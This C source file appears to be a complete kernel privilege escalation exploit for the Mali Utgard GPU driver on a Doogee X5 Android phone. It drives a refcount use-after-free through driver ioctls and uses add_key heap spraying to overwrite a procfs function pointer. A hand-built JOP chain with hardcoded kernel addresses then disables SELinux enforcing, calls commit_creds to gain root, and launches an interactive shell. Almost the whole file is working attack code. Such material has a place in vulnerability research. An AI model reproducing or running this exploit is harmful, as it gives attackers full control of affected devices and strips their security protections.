#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h> 
#include <sys/syscall.h>

// addresses for getting root
#define PREPARE_KERNEL_CRED_ADDR 0xc0046e44
#define COMMIT_CREDS_ADDR        0xc0046760
#define SELINUX_ENFORCING_ADDR   0xc0ff8e84
#define MEMCPY_ADDR              0xc0276fd4

#define PROC_FILE "/proc/driver/wmt_dbg"

#define FAKE_MALI_ALLOC_BUFF_SIZE 96
#define JOPCHAIN_BUFFER_SIZE 1024

// Mali definitions
#define MALI_IOC_BASE           0x82
#define _MALI_UK_MEMORY_SUBSYSTEM    1
#define MALI_IOC_MEMORY_BASE    (_MALI_UK_MEMORY_SUBSYSTEM + MALI_IOC_BASE)

#define _MALI_UK_ALLOC_MEM      0
#define _MALI_UK_FREE_MEM       1
#define _MALI_UK_UNBIND_MEM     3

#define MALI_IOC_MEM_ALLOC                  _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_ALLOC_MEM, _mali_uk_alloc_mem_s)
#define MALI_IOC_MEM_FREE                   _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_FREE_MEM, _mali_uk_free_mem_s)
#define MALI_IOC_MEM_UNBIND                 _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_UNBIND_MEM, _mali_uk_unbind_mem_s)

typedef struct {
    uint64_t ctx;                   // [in,out] user-kernel context
    uint32_t gpu_vaddr;             // [in] GPU virtual address  
    uint32_t vsize;                 // [in] virtual size of the allocation
    uint32_t psize;                 // [in] physical size of the allocation
    uint32_t flags;                 // [in] allocation flags
    uint32_t backend_handle;        // [out] backend handle
    // int32_t secure_shared_fd;       // [in] the mem handle for secure mem
} _mali_uk_alloc_mem_s;

typedef struct {
	uint64_t ctx;                      /**< [in,out] user-kernel context (trashed on output) */
	uint32_t gpu_vaddr;                /**< [in] use as handle to free allocation */
	uint32_t free_pages_nr;      /** < [out] record the number of free pages */
} _mali_uk_free_mem_s;

typedef struct {
    uint64_t ctx;                // User-kernel context
    uint32_t flags;              // Flags
    uint32_t vaddr;              // Mali address
} _mali_uk_unbind_mem_s;

typedef struct {
    void *addr;
    size_t size;
    int success;
} mmap_result_t;

#define KEY_SPEC_PROCESS_KEYRING -2
#define KEYCTL_REVOKE 3

typedef int32_t key_serial_t;


// spoofed structures for spray
struct allocation_manager {
    uint32_t vm_lock;           // offset 0x0 - set to 0x0
    uint8_t padding[0xc];       // padding to fill space
};

struct kernel_mutex {
    volatile int32_t lock_count;  // Must be at offset 0x0
    int32_t padding[3];           // Padding to get owner at offset 0x10
    void* owner;                  
};

// Structure for session
struct session {
    uint8_t padding[0xd8];               // padding to reach offset 0xe0
    struct allocation_manager alloc_mgr; // offset 0xd8 - allocation manager
    struct kernel_mutex mutex_lock;
};

// Structure for mali vma node
struct mali_vma_node {
    uint8_t padding[0x8];  
    uint32_t target_field;      // offset 0x8 - this needs to be 0
};

static struct allocation_manager g_alloc_mgr;
static struct session g_session;
static struct mali_vma_node g_vma_node;


// Direct syscall wrapper - no header needed
static inline key_serial_t add_key(const char *type, const char *desc,
                                    const void *payload, size_t plen,
                                    key_serial_t ringid)
{
    return syscall(__NR_add_key, type, desc, payload, plen, ringid);
}

static inline long keyctl_revoke(key_serial_t key)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, key);
}


// exploit won't work without this ;)
void important_ascii_art() {
    printf("\n\033[38;5;225m");
    printf("███████ ██████  ███████ ██      ███████ \n");
    printf("\033[38;5;183m");
    printf("██      ██   ██ ██      ██      ██      \n");
    printf("\033[38;5;141m");
    printf("█████   ██████  █████   ██      ███████ \n");
    printf("\033[38;5;99m");
    printf("██      ██   ██ ██      ██           ██ \n");
    printf("\033[38;5;57m");
    printf("██      ██   ██ ███████ ███████ ███████ \n\n");
    printf("               Doogee X5\n");
    printf("\n\033[0m");
}


_mali_uk_alloc_mem_s mali_alloc_memory(int mali_fd, _mali_uk_alloc_mem_s input) {
    _mali_uk_alloc_mem_s result = input;
    
    int ret = ioctl(mali_fd, MALI_IOC_MEM_ALLOC, &result);
    
    if (ret == -1) {
        printf("  ERROR: %s (errno: %d)\n", strerror(errno), errno);
    }
    
    return result;
}


mmap_result_t mali_mmap_allocation(int mali_fd, uint32_t gpu_vaddr) {
    mmap_result_t mapping;
    
    printf("[+] Memory mapping GPU address 0x%08x...\n", gpu_vaddr);
    
    // mmap the Mali allocation using its GPU virtual address as offset
    // The GPU virtual address becomes the offset for mmap
    void *mapped_addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, 
                            mali_fd, gpu_vaddr);
    
    mapping.size = 4096;
    
    if (mapped_addr == MAP_FAILED) {
        mapping.addr = NULL;
        mapping.success = 0;
        printf("[+] Mapping failed\n");
    } else {
        mapping.addr = mapped_addr;
        mapping.success = 1;
        printf("[+] Successfully mapped\n");
    }
    
    return mapping;
}


void mali_do_munmap(mmap_result_t mapping) {
    if (mapping.success && mapping.addr) {
        if (munmap(mapping.addr, mapping.size) != 0) {
            printf("  Failed to unmap %p: %s\n", mapping.addr, strerror(errno));
        }
    }
}

int trigger_overwritten_function_pointer() {
    uint64_t buffer[1024];
    int fd;
    
    // Try to open the device normally
    fd = open(PROC_FILE, O_RDONLY);
    if (fd < 0) {
        return 1;
    }

    // Construct the JOP-chain the kernel will execute
    uint32_t jop_buffer[JOPCHAIN_BUFFER_SIZE / 4];
    memset(jop_buffer, 0, sizeof(jop_buffer));


    // Gets an allocation in kmalloc-128, sets freelist pointer at start to 0x0 using memcpy
    // turns off selinux enforcing, then executes commit_creds(prepare_kernel_cred(NULL)) to get root

    // Save stack values
    //   c023ac68 0d c0 a0 e1     cpy        r12,sp
    //   c023ac6c f0 d8 2d e9     stmdb      sp!,{r4,r5,r6,r7,r11,r12,lr,pc}
    //   c023ac70 04 b0 4c e2     sub        r11,r12,#0x4
    //   c023ac74 04 30 91 e5     ldr        r3,[r1,#0x4]
    //   c023ac78 01 50 a0 e1     cpy        r5,r1
    //   c023ac7c 28 60 91 e5     ldr        r6,[r1,#0x28]
    //   c023ac80 00 70 a0 e1     cpy        r7,r0
    //   c023ac84 33 ff 2f e1     blx        r3
    jop_buffer[0x4 / 4] = 0xc04aa448;                       // r3, next gadget
    jop_buffer[0x28 / 4] = 0x0;                             // r6, unused


    // need to call this function at address 0xc003e528 and store 0x0 at the start of it, this will break loop in freelist
    // void USE_THIS_FOR_KERNEL_FIX(void)
    // {
    //     int iVar1;
        
    //     iVar1 = kzalloc(_DAT_c0fee4c0,0x80d0,0x58);
    //     if (iVar1 == 0) {
    //         return;
    //     }
    //     *(int *)iVar1 = iVar1;
    //     *(int *)(iVar1 + 4) = iVar1;
    //     *(int *)(iVar1 + 0x18) = iVar1 + 0x18;
    //     *(int *)(iVar1 + 0x1c) = iVar1 + 0x18;
    //     *(int *)(iVar1 + 0x28) = iVar1 + 0x28;
    //     *(int *)(iVar1 + 0x2c) = iVar1 + 0x28;
    //     *(undefined4 *)(iVar1 + 0x34) = 8;
    //     return;
    // }

    // Get r1 into r4
    //   c04aa448 8c 30 91 e5     ldr        r3,[r1,#0x8c]
    //   c04aa44c 01 00 a0 e1     cpy        r0,r1
    //   c04aa450 01 40 a0 e1     cpy        r4,r1
    //   c04aa454 33 ff 2f e1     blx        r3
    jop_buffer[0x8c / 4] = 0xc03b8e1c; // r3, next gadget

    // Increment r4 so we can reuse same gadgets
    //   c03b8e1c 48 40 84 e2     add        r4,r4,#0x48
    //   c03b8e20 28 c0 95 e5     ldr        r12,[r5,#0x28] // NOTE: r5 contains r1 from earlier
    //   c03b8e24 3c ff 2f e1     blx        r12
    jop_buffer[0x28 / 4] = 0xc05d1b74; // r12, next gadget

    // Now call the kmalloc wrapper function to get allocation
    //   c05d1b74 74 30 94 e5     ldr        r3,[r4,#0x74]
    //   c05d1b78 00 00 53 e3     cmp        r3,#0x0          // ignore
    //   c05d1b7c 2a 00 00 0a     beq        LAB_c05d1c2c     // ignore
    //   c05d1b80 33 ff 2f e1     blx        r3
    //   c05d1b84 64 30 94 e5     ldr        r3,[r4,#0x64]
    //   c05d1b88 33 ff 2f e1     blx        r3
    jop_buffer[(0x48 + 0x74) / 4] = 0xc003e528; // r3 (0xbc), address of kmalloc wrapper function
    jop_buffer[(0x48 + 0x64) / 4] = 0xc03b9d60; // r3 (0xac), next gadget

    // now the allocation is in r0, so we need to write 0 to it, lets use memcpy
    //   c03b9d60 48 40 84 e2     add        r4,r4,#0x48
    //   c03b9d64 10 30 95 e5     ldr        r3,[r5,#0x10]  // r5 contains r1 from earlier
    //   c03b9d68 33 ff 2f e1     blx        r3
    jop_buffer[0x10 / 4] = 0xc02e94a0; // r3, next gadget

    jop_buffer[0x0] = 0x0; // for the memcpy, needs to contain 0x0 in src

    // Now load the value 0x4 into r2 for the memcpy argument (only nulling pointer at start)
    //   c02e94a0 ec 20 94 e5     ldr        r2,[r4,#0xec]
    //   c02e94a4 34 30 0b e5     str        r3,[r11,#local_38]   // ignore?
    //   c02e94a8 44 30 94 e5     ldr        r3,[r4,#0x44]
    //   c02e94ac 33 ff 2f e1     blx        r3
    jop_buffer[(0x48 + 0x48 + 0xec) / 4] = 0x4; // r2 (0x17c)
    jop_buffer[(0x48 + 0x48 + 0x44) / 4] = 0xc05d1b74; // r3 (0xd4)

    // Now call the memcpy function
    //   c05d1b74 74 30 94 e5     ldr        r3,[r4,#0x74]
    //   c05d1b78 00 00 53 e3     cmp        r3,#0x0          // ignore
    //   c05d1b7c 2a 00 00 0a     beq        LAB_c05d1c2c     // ignore
    //   c05d1b80 33 ff 2f e1     blx        r3
    //   c05d1b84 64 30 94 e5     ldr        r3,[r4,#0x64]
    //   c05d1b88 33 ff 2f e1     blx        r3
    jop_buffer[(0x48 + 0x48 + 0x74) / 4] = MEMCPY_ADDR; // r3 (0x104)
    jop_buffer[(0x48 + 0x48 + 0x64) / 4] = 0xc00e9f08; // r3 (0xf4)

    // Restore the r1 register to point to controlled data again
    //   c00e9f08 18 30 94 e5     ldr        r3,[r4,#0x18]
    //   c00e9f0c 10 10 94 e5     ldr        r1,[r4,#0x10]
    //   c00e9f10 33 ff 2f e1     blx        r3
    jop_buffer[(0x48 + 0x48 + 0x18) / 4] = 0xc0083770; // r3 (0xa8), next gadget

    uint32_t offset = 0x180;
    jop_buffer[(0x48 + 0x48 + 0x10) / 4] = (uint32_t) (jop_buffer + (offset / 4)); // r1 (0xa0), address to restore (pointer to controlled data)


    // Now we (should) have fixed the freelist, we can work on escalating privileges, starting with disabling selinux

    // Load value into r0 (address of selinux enforcing)
    //   c0083770 10 30 91 e5     ldr        r3,[r1,#0x10]
    //   c0083774 00 50 a0 e1     cpy        r5,r0
    //   c0083778 01 40 a0 e1     cpy        r4,r1
    //   c008377c 18 00 91 e5     ldr        r0,[r1,#0x18]
    //   c0083780 04 10 91 e5     ldr        r1,[r1,#0x4]
    //   c0083784 33 ff 2f e1     blx        r3
    jop_buffer[(offset + 0x10) / 4] = 0xc07fa654; // r3, next gadget
    jop_buffer[(offset + 0x18) / 4] = SELINUX_ENFORCING_ADDR - 0x1c; // r0, selinux enforcing global address
    // jop_buffer[0x4 / 4] = 0xc0083770; // IGNORE

    // Load 0x0 into r6 to write to the global
    //   c07fa654 38 30 94 e5     ldr        r3,[r4,#0x38]
    //   c07fa658 00 00 53 e3     cmp        r3,#0x0
    //   c07fa65c 04 00 00 0a     beq        LAB_c07fa674
    //   c07fa660 44 60 94 e5     ldr        r6,[r4,#0x44]
    //   c07fa664 33 ff 2f e1     blx        r3
    jop_buffer[(offset + 0x38) / 4] = 0xc0653300; // r3, next gadget
    jop_buffer[(offset + 0x44) / 4] = 0x0; // r6, value to write to selinux enforcing

    // Save 0 at enforcing
    //   c0653300 1c 60 80 e5     str        r6,[r0,#0x1c]
    //   c0653304 68 00 94 e5     ldr        r0,[r4,#0x68]
    //   c0653308 08 30 90 e5     ldr        r3,[r0,#0x8]
    //   c065330c 10 30 93 e5     ldr        r3,[r3,#0x10]
    //   c0653310 33 ff 2f e1     blx        r3
    jop_buffer[(offset + 0x68) / 4] = (uint32_t) (jop_buffer + (offset / 4)); // r0, gadget loaded from there
    jop_buffer[(offset + 0x8) / 4] = (uint32_t) (jop_buffer + (offset / 4) - 1); // r3, must point to next gadget - 0x10
    jop_buffer[(offset + 0xc) / 4] = 0xc03a2c28; // r3, next gadget


    // Now selinux enforcing dealt with, lets execute commit_creds(prepare_kernel_cred(NULL))

    // Clear r0
    //   c03a2c28 48 30 90 e5     ldr        r3,[r0,#0x48]
    //   c03a2c2c 00 00 a0 e3     mov        r0,#0x0
    //   c03a2c30 33 ff 2f e1     blx        r3
    jop_buffer[(offset + 0x48) / 4] = 0xc05d1b74; // r3, next gadget

    // Call prepare_kernel_cred
    //   c05d1b74 74 30 94 e5     ldr        r3,[r4,#0x74]
    //   c05d1b78 00 00 53 e3     cmp        r3,#0x0          // ignore
    //   c05d1b7c 2a 00 00 0a     beq        LAB_c05d1c2c     // ignore
    //   c05d1b80 33 ff 2f e1     blx        r3
    //   c05d1b84 64 30 94 e5     ldr        r3,[r4,#0x64]
    //   c05d1b88 33 ff 2f e1     blx        r3
    jop_buffer[(offset + 0x74) / 4] = PREPARE_KERNEL_CRED_ADDR; // r3, address of the function to call (prepare_kernel_cred)
    jop_buffer[(offset + 0x64) / 4] = 0xc08c2748; // r3, address of the next gadget

    // Just needed to fix r5 for next gadget
    //   c08c2748 c0 31 94 e5     ldr        r3,[r4,#0x1c0]
    //   c08c274c 50 50 84 e2     add        r5,r4,#0x50    // get valid address into r5
    //   c08c2750 34 21 84 e5     str        r2,[r4,#0x134]
    //   c08c2754 33 ff 2f e1     blx        r3
    jop_buffer[(offset + 0x1c0) / 4] = 0xc05d135c; // r3, next gadget

    // Call commit_creds without touching r0
    //   c05d135c 50 30 94 e5     ldr        r3,[r4,#0x50]
    //   c05d1360 33 ff 2f e1     blx        r3
    //   c05d1364 5c 30 94 e5     ldr        r3,[r4,#0x5c]
    //   c05d1368 b4 00 d5 e1     ldrh       r0,[r5,#0x4]   // ignore, just make sure r5 is valid
    //   c05d136c 33 ff 2f e1     blx        r3
    jop_buffer[(offset + 0x50) / 4] = COMMIT_CREDS_ADDR; // r3, address of the function to call (commit_creds)
    jop_buffer[(offset + 0x5c) / 4] = 0xc023acd4; // r3, address of the next gadget

    // Cleanup stack like nothing ever happened
    //   c023acd4 04 00 a0 e1     cpy        r0=>DAT_fffffff4,r4
    //   c023acd8 f0 a8 9d e8     ldmia      sp,{r4,r5,r6,r7,r11,sp,pc}

    // Try a small read
    ssize_t bytes_read = read(fd, jop_buffer, sizeof(jop_buffer));
    
    close(fd);
    
    return 0;
}

int main() {
    important_ascii_art();

    int mali_fd;

    // Open the Mali device
    mali_fd = open("/dev/mali", O_RDWR);
    if (mali_fd < 0) {
        perror("[-] Failed to open /dev/mali");
        return -1;
    }
    printf("[+] Successfully opened /dev/mali (fd=%d)\n", mali_fd);


    // STEP 1: Use MALI_IOC_MEM_ALLOC to create mali_alloc object in kmalloc-128
    printf("\n[1] Allocate victim mali_alloc\n");
    _mali_uk_alloc_mem_s victim_mali_alloc_input = {0};
    victim_mali_alloc_input.ctx = 0;
    victim_mali_alloc_input.gpu_vaddr = 0x0;
    victim_mali_alloc_input.vsize = 4096;
    victim_mali_alloc_input.psize = 4096;
    victim_mali_alloc_input.flags = 0x0;
    victim_mali_alloc_input.backend_handle = 0;
    
    _mali_uk_alloc_mem_s result = mali_alloc_memory(mali_fd, victim_mali_alloc_input);
    
    printf("[+] Mali allocation successful!\n");
    printf("    GPU VAddr: 0x%08x\n", result.gpu_vaddr);
    printf("    Backend Handle: 0x%08x\n", result.backend_handle);

    

    // STEP 2: Do mmap on this to increment the refcount associated with the mali_alloc object
    printf("\n[2] Doing mali_alloc mmap\n");

    uint32_t victim_mmap_offset = result.gpu_vaddr;
    mmap_result_t mapping = mali_mmap_allocation(mali_fd, victim_mmap_offset);
    
    if (!mapping.success) {
        printf("[-] Failed to create mapping\n");
        close(mali_fd);
        return -1;
    }


    // STEP 3: NOW USE THE BUG TO DECREMENT THE REFCOUNT IN THE VICTIM OBJECT TO JUST BEFORE UAF
    printf("\n[3] Calling MALI_IOC_MEM_UNBIND on victim to decrement refcount\n");
    
    _mali_uk_unbind_mem_s unbind_params;
    memset(&unbind_params, 0, sizeof(unbind_params));
    unbind_params.ctx = result.ctx;
    unbind_params.vaddr = result.gpu_vaddr;
    unbind_params.flags = 0x100; // _MALI_MEMORY_BIND_BACKEND_UMP
    
    int ioc_result = ioctl(mali_fd, MALI_IOC_MEM_UNBIND, &unbind_params);
    if (ioc_result != 0) {
        printf("[-] UNBIND failed: %s\n", strerror(errno));
    }


    // STEP 4: Setup for add_key spray
    printf("\n[4] Setting up add_key spray for fake mali_alloc\n");

        // init structures for UAF (fake mali_alloc)
    memset(&g_alloc_mgr, 0, sizeof(g_alloc_mgr));
    memset(&g_session, 0, sizeof(g_session));
    memset(&g_vma_node, 0, sizeof(g_vma_node));
    
    g_alloc_mgr.vm_lock = 0x0; // vm_lock at offset 0x0 = 0x0
    g_session.alloc_mgr = g_alloc_mgr;
    g_session.mutex_lock.lock_count = 1; // Initialize to unlocked state (1 = unlocked)
    g_session.mutex_lock.owner = 0x0;
    g_vma_node.target_field = 0x0; // mali vma node has 0 at offset 0x8


    // build the fake structure to spray
    uint32_t fake_mali_alloc_buff[FAKE_MALI_ALLOC_BUFF_SIZE / 4];
    memset(fake_mali_alloc_buff, 0x0, sizeof(fake_mali_alloc_buff));

    // set refcount to 1 to cause the free to be called in our UAF object
    fake_mali_alloc_buff[0x4c / 4] = 0x00000001; 

    // Set offset 0x3c to 0x00000000 (mali_alloc->mali_vma_node).field13_0x1c)
    fake_mali_alloc_buff[0x3c / 4] = 0x00000000;

    // Set offset 0xc (index 3) to contain pointer to session (requirement 2)
    fake_mali_alloc_buff[0xc / 4] = (uintptr_t)&g_session;

    // Set offset 0x20 (index 8) to contain pointer to mali vma node (requirement 3)
    fake_mali_alloc_buff[0x28 / 4] = 0x00000000; // set refcount to 1

    // overwrite list pointers to point to shellcode
    fake_mali_alloc_buff[0x40 / 4] = 0xc09bb2c0 - 0x4; // where to write it (wmt_dbg read function pointer)
    fake_mali_alloc_buff[0x44 / 4] = (uint32_t)0xc023ac68 - 0x4; // what to write (address of shellcode - 0x4)


    // STEP 5: TRIGGER UAF AND SPRAY
    printf("\n[5 + 6] Triggering UAF and spraying with add_key then doing munmap for write\n");

    // Trigger unbind to free the object
    ioctl(mali_fd, MALI_IOC_MEM_UNBIND, &unbind_params);
    
    // Spray using add_key - this allocates in kmalloc-128
    key_serial_t spray_key = add_key("user", "spray_0", fake_mali_alloc_buff, sizeof(fake_mali_alloc_buff), KEY_SPEC_PROCESS_KEYRING);

    // STEP 6: CALL MUNMAP ON THE VICTIM TO DECREMENT THE TARGET POINTER IN THE UAF OBJECT
    mali_do_munmap(mapping);


    // Now we have free'd that memory twice and we have looped the freelist
    // This means that every allocation on this cpu in the kmalloc-128 cache will keep recieving this memory
    // We can fix the freelist by breaking the loop
    // The SLUB allocator uses first 8 bytes of free memory to store a pointer to the next free element
    // If we set this to null and dont free the memory, the chain will be broken and this should fix everything
    // Just make sure we don't free the returned memory again
    
    // Seems a bit happier when we call it twice? Might be a quirk of memcpy or something
    trigger_overwritten_function_pointer();
    trigger_overwritten_function_pointer();

    printf("\n[7] Triggered JOP chain via %s...\n", PROC_FILE); // dont waste time printing before trigger, gotta fix the freelist ASAP


    // Cleanup: revoke and free key
    printf("\n[8] Cleanup\n");
    if (spray_key > 0) {
        keyctl_revoke(spray_key);
    }
    
    close(mali_fd);
    printf("\n[*] Done! Lets see if we got root...\n");

    if (getuid() == 0) {
        printf("[+] We got root! Popping shell...\n");
        char* shell = "/system/bin/sh";
        char* args[] = {shell, "-i", NULL};
        execve(shell, args, NULL);
    } else {
        printf("[-] Utgard won the battle but not the war... try again\n");
    }

    return 0;
}